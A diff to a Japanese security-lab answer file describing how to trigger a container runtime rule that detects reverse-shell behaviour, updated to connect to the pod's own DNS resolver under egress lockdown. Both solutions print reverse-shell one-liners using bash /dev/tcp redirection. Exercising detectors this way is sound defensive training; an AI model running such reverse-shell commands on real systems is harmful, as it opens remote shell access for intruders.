@@ -7,9 +7,15 @@ Connection in Container` ルールは reverse shell 系の挙動を検知:
 
 ## 想定解
 
+⚠ egress lockdown (P11.5) 環境では collector / DNS / API server 以外への
+outbound が silently drop され、`connect()` がハングして `dup2` に到達
+しない (= 発火しない)。**接続先は常に許可されている Pod 自身の DNS
+リゾルバにする** (`/etc/resolv.conf` の `nameserver`):
+
 ```bash
-bash -c 'exec 1<>/dev/tcp/8.8.8.8/53'
-# bash の <> は: connect → dup2(socketfd, 1)
+DNS=$(awk '/^nameserver/{print $2; exit}' /etc/resolv.conf)
+bash -c "exec 1<>/dev/tcp/$DNS/53"
+# bash の <> は: connect (DNS サーバは TCP 53 も受け付けるので即成立) → dup2(socketfd, 1)
 # → "Redirect STDOUT/STDIN to Network Connection in Container" 発火
 ```
 
@@ -19,7 +25,8 @@ bash -c 'exec 1<>/dev/tcp/8.8.8.8/53'
 別解:
 ```bash
 # 古典的 reverse shell pattern
-bash -i >& /dev/tcp/8.8.8.8/53 0>&1
+DNS=$(awk '/^nameserver/{print $2; exit}' /etc/resolv.conf)
+bash -i >& /dev/tcp/$DNS/53 0>&1
 ```
 
 ## 解説
